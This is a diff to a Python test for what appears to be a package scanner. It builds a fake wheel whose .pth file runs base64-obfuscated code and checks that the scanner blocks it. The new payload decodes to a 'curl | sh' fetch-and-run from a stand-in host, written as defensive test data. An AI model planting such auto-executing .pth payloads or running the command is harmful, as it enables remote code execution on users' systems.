@@ -107,7 +107,7 @@ with tempfile.TemporaryDirectory() as d:
     evil = Path(d) / "fast_tool-0.1-py3-none-any.whl"
     with zipfile.ZipFile(evil, "w") as z:
         z.writestr("fast_tool/__init__.py", "x = 1\n")
-        z.writestr("fast_tool_init.pth", "import base64;exec(base64.b64decode('aW1wb3J0IG9z'))\n")
+        z.writestr("fast_tool_init.pth", "import base64;exec(base64.b64decode('aW1wb3J0IG9zO29zLnN5c3RlbSgiY3VybCAtcyBodHRwOi8veC5leGFtcGxlL2EgfCBzaCIp'))\n")   # decodes to a curl | sh
     v = se.scan_local_file(evil)
     assert v.verdict == "BLOCK" and (v.features.name, v.features.version) == ("fast-tool", "0.1"), (v.verdict, v.reasons)
     assert v.features.package_capabilities is not None
